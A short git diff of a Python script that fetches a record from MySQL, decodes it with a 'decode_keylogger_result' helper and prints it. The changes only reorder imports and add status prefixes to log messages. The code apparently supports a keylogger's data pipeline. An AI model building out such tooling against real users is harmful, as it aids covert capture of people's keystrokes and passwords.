@@ -1,8 +1,9 @@
 # decode_example.py
 
-from decoder import decode_keylogger_result
-from db_connector import connect_to_db
 from mysql.connector import Error
+
+from db_connector import connect_to_db
+from decoder import decode_keylogger_result
 
 
 def retrieve_and_decode_key(key_to_find):
@@ -23,12 +24,12 @@ def retrieve_and_decode_key(key_to_find):
                 original_key, salt = decode_keylogger_result(record[0])
 
                 # Print the original key
-                print(f"Decoded Key: {original_key}")
+                print(f"COMPLETE: Decoded Sentence: {original_key}")
             else:
-                print("No matching record found.")
+                print("WARN: No matching record found.")
 
         except Error as e:
-            print("Failed to retrieve data from MySQL table", e)
+            print("ERROR: Failed to retrieve data from MySQL table", e)
         finally:
             cursor.close()
             connection.close()
